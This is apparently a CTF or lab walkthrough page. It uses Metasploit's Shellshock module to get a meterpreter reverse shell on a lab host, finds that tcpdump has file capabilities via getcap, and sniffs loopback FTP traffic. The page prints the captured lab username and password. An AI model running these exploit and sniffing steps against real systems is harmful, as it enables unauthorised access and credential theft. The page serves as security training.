<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.1 Metasploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>4.1 Metasploit</u></b></h1><br />a) Run “metasploit” and look for this vulnerability.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$msfconsole</span><br />msf5&nbsp;&gt;&nbsp;search&nbsp;shellshock<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/394-1.png" alt="images/394-1.png" /><br /><br />b) Use this exploit.<br /><br /><div class="codebox"><div class="codebox">msf5&nbsp;&gt;&nbsp;use&nbsp;exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<br />msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;RHOST&nbsp;192.168.12.78<br />msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LHOST&nbsp;195.168.12.56<br />msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;targeturi&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>cgi-bin<span style="color:#ff9d00;font-weight:700">/</span>underworld<span style="color:#ff9d00;font-weight:700">/</span><br />msf5&nbsp;exploit<span style="color:#ff9d00;font-weight:700">(</span>multi<span style="color:#ff9d00;font-weight:700">/</span>http<span style="color:#ff9d00;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;exploit&nbsp;<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/394-2.png" alt="images/394-2.png" /><br /><br />You got a "meterpreter".<br /><br />c) Check the System Info.<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;sysinfo&nbsp;</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/394-3.png" alt="images/394-3.png" /><br /><br />d) Show User information.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">id</span></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/394-4.png" alt="images/394-4.png" /><br /><br />This user is a member of “pcap” group, so we can examine file capabilities with “<a href="http://www.man7.org/linux/man-pages/man8/getcap.8.html#DESCRIPTION">getcap</a>”.<br /><br /><div class="codebox"><div class="codebox">getcap&nbsp;-r&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/394-5.png" alt="images/394-5.png" /><br /><br />It has capabilities of running “<a href="https://www.tcpdump.org/manpages/tcpdump.1.html">tcpdump</a>”.<br /><br /><br />d) Run “tcpdump”.<br /><br />-D: Print the list of the network interfaces available on the system .  <br /><br /><br /><div class="codebox"><div class="codebox">tcpdump&nbsp;-D<br /></div></div><br /><br /> <span style="color:#ffa500;">Output:</span><br /><img src="images/394-6.png" alt="images/394-6.png" /><br /><br />e) Inspect the traffic.<br /><br />Monitor for all traffic going over port 21 over the interface “lo”, which is the “loopback interface” that listens for connections to 127.0.0.1.<br /><br /><br /><div class="codebox"><div class="codebox">tcpdump&nbsp;-v&nbsp;-i&nbsp;lo&nbsp;port&nbsp;21<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/394-7.png" alt="images/394-7.png" /><br /><br />You got the credentials.<br /><br />User: hades<br />Password: PTpZTfU4vxgzvRBE<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>